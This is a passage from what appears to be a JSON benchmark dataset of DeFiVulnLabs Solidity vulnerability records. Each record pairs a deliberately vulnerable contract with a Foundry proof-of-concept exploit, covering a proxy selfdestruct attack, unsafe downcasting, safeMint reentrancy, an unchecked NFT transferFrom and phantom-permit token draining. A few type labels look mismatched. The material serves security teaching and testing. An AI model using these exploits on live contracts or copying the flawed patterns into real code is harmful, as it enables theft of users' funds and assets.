hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) {\n            (bool success, ) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    event Returny(uint256);\n\n    function greetMe() public {\n        emit Returny(0x42);\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(\n            Address.isContract(newImplementation),\n            \"ERC1967: new implementation is not a contract\"\n        );\n\n        AddressSlot storage r;\n        assembly {\n            r.slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n\ncontract Attack {\n    function attack() external {\n        selfdestruct(payable(msg.sender));\n    }\n}\n",
    "vulnerable_contract_only": "contract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Uninitialized variable Vulnerability",
    "description": "Uninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Uninitialized_variables.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unsafe-downcast",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "unsafe-downcast.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// Import the SafeCast library\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n/*\nName: Unsafe downcasting\n\nDescription:\nDowncasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.\n\nMitigation:  \nMake sure consistent uint256, or use openzepplin safeCasting.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1673511868839886849\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/369\nhttps://github.com/sherlock-audit/2022-10-union-finance-judging/issues/96\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testUnsafeDowncast() public {\n        SimpleBankContract.deposit(257); //overflowed\n\n        console.log(\n            \"balance of SimpleBankContract:\",\n            SimpleBankContract.getBalance()\n        );\n\n        // balance is 1, because of overflowed\n        assertEq(SimpleBankContract.getBalance(), 1);\n    }\n\n    function testsafeDowncast() public {\n        vm.expectRevert(\"SafeCast: value doesn't fit in 8 bits\");\n        FixedSimpleBankContract.deposit(257); //revert\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeCast for uint256; // Use SafeCast for uint256\n\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 _amount) public {\n        // Use the `toUint8()` function from `SafeCast` to safely downcast `amount`.\n        // If `amount` is greater than `type(uint8).max`, it will revert.\n        // or keep the same uint256 with amount.\n        uint8 amount = _amount.toUint8(); // or keep uint256\n\n        // Store the balance\n        balances[msg.sender] = amount;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit(uint256 amount) public {\n        // Here's the unsafe downcast. If the `amount` is greater than type(uint8).max\n        // (which is 255), then only the least significant 8 bits are stored in balance.\n        // This could lead to unexpected results due to overflow.\n        uint8 balance = uint8(amount);\n\n        // store the balance\n        balances[msg.sender] = balance;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unchecked_call",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unsafe downcasting",
    "description": "Downcasting from a larger integer type to a smaller one without checks can lead to unexpected behavior \nif the value of the larger integer is outside the range of the smaller one.",
    "scenario": "",
    "fix_description": "Make sure consistent uint256, or use openzepplin safeCasting.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/unsafe-downcast.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_struct-deletion",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Struct-deletion.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Struct Deletion Oversight\n\nDescription:\nIncomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.\n\nMitigation:  \nTo fix this bug, you should delete the mapping inside the struct before deleting the struct itself.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676836264245592065\nhttps://docs.soliditylang.org/en/develop/types.html\n*/\n\ncontract ContractTest is Test {\n    StructDeletionBug StructDeletionBugContract;\n    FixedStructDeletion FixedStructDeletionContract;\n\n    function setUp() public {\n        StructDeletionBugContract = new StructDeletionBug();\n        FixedStructDeletionContract = new FixedStructDeletion();\n    }\n\n    function testStructDeletion() public {\n        StructDeletionBugContract.addStruct(10, 10);\n        StructDeletionBugContract.getStruct(10, 10);\n        StructDeletionBugContract.deleteStruct(10);\n        StructDeletionBugContract.getStruct(10, 10);\n    }\n\n    function testFixedStructDeletion() public {\n        FixedStructDeletionContract.addStruct(10, 10);\n        FixedStructDeletionContract.getStruct(10, 10);\n        FixedStructDeletionContract.deleteStruct(10);\n        FixedStructDeletionContract.getStruct(10, 10);\n    }\n\n    receive() external payable {}\n}\n\ncontract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\ncontract FixedStructDeletion {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        // Check if all flags are deleted, then delete the mapping\n        for (uint256 i = 0; i < 15; i++) {\n            delete myStruct.flags[i];\n        }\n        delete myStructs[structId];\n    }\n}\n",
    "vulnerable_contract_only": "contract StructDeletionBug {\n    struct MyStruct {\n        uint256 id;\n        mapping(uint256 => bool) flags;\n    }\n\n    mapping(uint256 => MyStruct) public myStructs;\n\n    function addStruct(uint256 structId, uint256 flagKeys) public {\n        MyStruct storage newStruct = myStructs[structId];\n        newStruct.id = structId;\n        newStruct.flags[flagKeys] = true;\n    }\n\n    function getStruct(\n        uint256 structId,\n        uint256 flagKeys\n    ) public view returns (uint256, bool) {\n        MyStruct storage myStruct = myStructs[structId];\n        bool keys = myStruct.flags[flagKeys];\n        return (myStruct.id, keys);\n    }\n\n    function deleteStruct(uint256 structId) public {\n        MyStruct storage myStruct = myStructs[structId];\n        delete myStructs[structId];\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Struct Deletion Oversight",
    "description": "Incomplete struct deletion leaves residual data. \nIf you delete a struct containing a mapping, the mapping won't be deleted.\n\nThe bug arises because Solidity's delete keyword does not reset the storage to its \ninitial state but rather performs a partial reset. \nWhen delete  myStructs[structId] is called, \nit only resets the id at mappingId to its default value 0, \nbut the other flags in the mapping remain unchanged. Therefore,\nif the struct is deleted without deleting the mapping inside, \nthe remaining flags will persist in storage.",
    "scenario": "",
    "fix_description": "To fix this bug, you should delete the mapping inside the struct before deleting the struct itself.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Struct-deletion.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_unprotected-callback",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Unprotected-callback.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\n\n/*\nName: Unprotected callback - ERC721 SafeMint reentrancy\n\nDescription:\nThe contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit. \n\nScenario:\nThis excersise is about a contract that via callback function to mint more NFTs\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a\nhttps://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code\n\n*/\n\ncontract ContractTest is Test {\n    MaxMint721 MaxMint721Contract;\n    bool complete;\n    uint256 maxMints = 10;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testSafeMint() public {\n        MaxMint721Contract = new MaxMint721();\n        MaxMint721Contract.mint(maxMints);\n        console.log(\"Bypassed maxMints, we got 19 NFTs\");\n        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);\n        console.log(\"NFT minted:\", MaxMint721Contract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        if (!complete) {\n            complete = true;\n            MaxMint721Contract.mint(maxMints - 1);\n            console.log(\"Called with :\", maxMints - 1);\n        }\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract MaxMint721 is ERC721Enumerable {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract MaxMint721 {\n    uint256 public MAX_PER_USER = 10;\n\n    constructor() ERC721(\"ERC721\", \"ERC721\") {}\n\n    function mint(uint256 amount) external {\n        require(\n            balanceOf(msg.sender) + amount <= MAX_PER_USER,\n            \"exceed max per user\"\n        );\n        for (uint256 i = 0; i < amount; i++) {\n            uint256 mintIndex = totalSupply();\n            _safeMint(msg.sender, mintIndex);\n        }\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "unprotected_callback",
    "severity": "high",
    "difficulty_tier": 3,
    "vulnerability_name": "Unprotected callback - ERC721 SafeMint reentrancy",
    "description": "The contract ContractTest is exploiting a callback feature to bypass the maximum mint limit \nset by the MaxMint721 contract. This is achieved by triggering the onERC721Received function,\nwhich internally calls the mint function again. Therefore, although MaxMint721 attempts \nto limit the number of tokens that a user can mint to MAX_PER_USER, the ContractTest contract \nsuccessfully mints more tokens than this limit.",
    "scenario": "This excersise is about a contract that via callback function to mint more NFTs",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Unprotected-callback.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_payable-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "payable-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Incorrect use of payable.transfer()\n\nDescription:\nAfter the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart contract:\n    1.does not implement a payable fallback function, or\n    2.implements a payable fallback function which would incur more than 2300 gas units, or\n    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.\n\nMitigation:  \nUsing call with its returned boolean checked in combination with re-entrancy guard is highly recommended.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1678958093273829376\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\nhttps://github.com/code-423n4/2022-12-escher-findings/issues/99\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testTransferFail() public {\n        SimpleBankContract.deposit{value: 1 ether}();\n        assertEq(SimpleBankContract.getBalance(), 1 ether);\n        vm.expectRevert();\n        SimpleBankContract.withdraw(1 ether);\n    }\n\n    function testCall() public {\n        FixedSimpleBankContract.deposit{value: 1 ether}();\n        assertEq(FixedSimpleBankContract.getBalance(), 1 ether);\n        FixedSimpleBankContract.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        //just a example for out of gas\n        SimpleBankContract.deposit{value: 1 ether}();\n    }\n}\n\ncontract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        (bool success, ) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \" Transfer of ETH Failed\");\n    }\n}\n",
    "vulnerable_contract_only": "contract SimpleBank {\n    mapping(address => uint) private balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function getBalance() public view returns (uint) {\n        return balances[msg.sender];\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n        balances[msg.sender] -= amount;\n        // the issue is here\n        payable(msg.sender).transfer(amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Incorrect use of payable.transfer()",
    "description": "After the implementation of EIP 1884 in the Istanbul hard fork, \nthe gas cost of the SLOAD operation was increased, \nresulting in the breaking of some existing smart contracts.\n\nWhen transferring ETH to recipients, if Solidity's transfer() or send() method \nis used, certain shortcomings arise, particularly when the recipient \nis a smart contract. These shortcomings can make it impossible to \nsuccessfully transfer ETH to the smart contract recipient.\n\nSpecifically, the transfer will inevitably fail when the smart contract:\n    1.does not implement a payable fallback function, or\n    2.implements a payable fallback function which would incur more than 2300 gas units, or\n    3.implements a payable fallback function incurring less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.",
    "scenario": "",
    "fix_description": "Using call with its returned boolean checked in combination with re-entrancy guard is highly recommended.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/payable-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_nft-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "NFT-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\nName: Unauthorized NFT Transfer in custom ERC721 implementation.\n\nDescription:\nCustom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.\n\n \nMitigation:  \nTo ensure that msg.sender is the current owner of the token or an approved address.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1679120390281412609\nhttps://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5\nhttps://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability\nhttps://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md\n*/\n\ncontract ContractTest is Test {\n    VulnerableERC721 VulnerableERC721Contract;\n    FixedERC721 FixedERC721Contract;\n    address alice = vm.addr(1);\n    address bob = vm.addr(2);\n\n    function setUp() public {\n        VulnerableERC721Contract = new VulnerableERC721();\n        VulnerableERC721Contract.safeMint(alice, 1);\n        FixedERC721Contract = new FixedERC721();\n        FixedERC721Contract.safeMint(alice, 1);\n    }\n\n    function testVulnerableERC721() public {\n        VulnerableERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        VulnerableERC721Contract.transferFrom(address(alice), address(bob), 1);\n\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    function testFixedERC721() public {\n        FixedERC721Contract.ownerOf(1);\n        vm.prank(bob);\n        vm.expectRevert();\n        FixedERC721Contract.transferFrom(address(alice), address(bob), 1);\n        console.log(VulnerableERC721Contract.ownerOf(1));\n    }\n\n    receive() external payable {}\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract VulnerableERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\ncontract FixedERC721 is ERC721, Ownable {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //Mitigation: add token owner check\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        require(\n            _isApprovedOrOwner(_msgSender(), tokenId),\n            \"ERC721: caller is not token owner or approved\"\n        );\n\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n    /*\n    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {\n        address owner = ERC721.ownerOf(tokenId);\n        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);\n    }\n*/\n}\n",
    "vulnerable_contract_only": "contract VulnerableERC721 {\n    constructor() ERC721(\"MyNFT\", \"MNFT\") {}\n\n    //custom transferFrom function which missing NFT owner check.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public override {\n        // direct transfer\n        _transfer(from, to, tokenId);\n    }\n\n    function safeMint(address to, uint256 tokenId) public onlyOwner {\n        _safeMint(to, tokenId);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Unauthorized NFT Transfer in custom ERC721 implementation.",
    "description": "Custom transferFrom function in contract VulnerableERC721, \ndoes not properly check if msg.sender is the current owner of the token or an approved address.\nAs a result, any address can call the transferFrom function to transfer any token, \nregardless of who the current owner is. \nThis allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.",
    "scenario": "",
    "fix_description": "To ensure that msg.sender is the current owner of the token or an approved address.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/NFT-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_phantom-permit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "phantom-permit.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/*\nName: Phantom function - Permit Function \n\nDescription:\nPhantom function: Accepts any call to a function that it doesn't actually define, without reverting.\nkey:\n1.Token that does not support EIP-2612 permit. \n2.Token has a fallback function.\nFor example: WETH.\n\nMitigation:  \nUse SafeERC20's safePermit - Revert on invalid signature.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671347058568237057\nhttps://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f\n*/\n\ncontract ContractTest is Test {\n    VulnPermit VulnPermitContract;\n    WETH9 WETH9Contract;\n\n    function setUp() public {\n        WETH9Contract = new WETH9();\n        VulnPermitContract = new VulnPermit(IERC20(address(WETH9Contract)));\n    }\n\n    function testVulnPhantomPermit() public {\n        address alice = vm.addr(1);\n        vm.deal(address(alice), 10 ether);\n\n        vm.startPrank(alice);\n        WETH9Contract.deposit{value: 10 ether}();\n        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);\n        vm.stopPrank();\n        console.log(\n            \"start WETH balanceOf this\",\n            WETH9Contract.balanceOf(address(this))\n        );\n\n        VulnPermitContract.depositWithPermit(\n            address(alice),\n            1000,\n            27,\n            0x0,\n            0x0\n        );\n        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));\n        console.log(\"WETH balanceOf VulnPermitContract\", wbal);\n\n        VulnPermitContract.withdraw(1000);\n\n        wbal = WETH9Contract.balanceOf(address(this));\n        console.log(\"WETH9Contract balanceOf this\", wbal);\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnPermit {\n    IERC20 public token;\n\n    constructor(IERC20 _token) {\n        token = _token;\n    }\n\n    function deposit(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function depositWithPermit(\n        address target,\n        uint256 amount,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public {\n        (bool success, ) = address(token).call(\n            abi.encodeWithSignature(\n                \"permit(address,uint256,uint8,bytes32,bytes32)\",\n                target,\n                amount,\n                v,\n                r,\n                s\n            )\n        );\n        require(success, \"Permit failed\");\n\n        require(\n            token.transferFrom(target, address(this), amount),\n            \"Transfer failed\"\n        );\n    }\n\n    function withdraw(uint256 amount) public {\n        require(token.transfer(msg.sender, amount), \"Transfer failed\");\n    }\n}\n\n// contract Permit {\n//     IERC20 public token;\n\n//     constructor(IERC20 _token) {\n//         token = _token;\n//     }\n\n//     function deposit(uint256 amount) public {\n//         require(\n//             token.transferFrom(msg.sender, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function depositWithPermit(\n//         address target,\n//         uint256 amount,\n//         uint8 v,\n//         bytes32 r,\n//         bytes32 s\n//     ) public {\n//         (bool success, ) = address(token).call(\n//             abi.encodeWithSignature(\n//                 \"permit(address,uint256,uint8,bytes32,bytes32)\",\n//                 target,\n//                 amount,\n//                 v,\n//                 r,\n//                 s\n//             )\n//         );\n//         require(success, \"Permit failed\");\n\n//         require(\n//             token.transferFrom(target, address(this), amount),\n//             \"Transfer failed\"\n//         );\n//     }\n\n//     function withdraw(uint256 amount) public {\n//         require(token.transfer(msg.sender, amount), \"Transfer failed\");\n//     }\n// }\n\ncontract WETH9 {\n    string public name = \"Wrapped Ether\";\n    string public symbol = \"WETH\";\n    uint8 public decimals = 18;\n\n    event Approval(address indexed src, address indexed guy, uint wad);\n    event Transfer(address indexed src, address indexed dst, uint wad);\n    event Deposit(address indexed dst, uint wad);\n    event Withdrawal(address indexed src, uint wad);\n\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    fallback() external payable {\n        deposit();\n    }\n\n    receive() external payable {}\n\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return address(this).balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) {\n        require(balanceOf[src] >= wad);\n\n        if (\n            src != msg.sender && allowance[src][msg.sender] != type(uint128).max\n        ) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n",
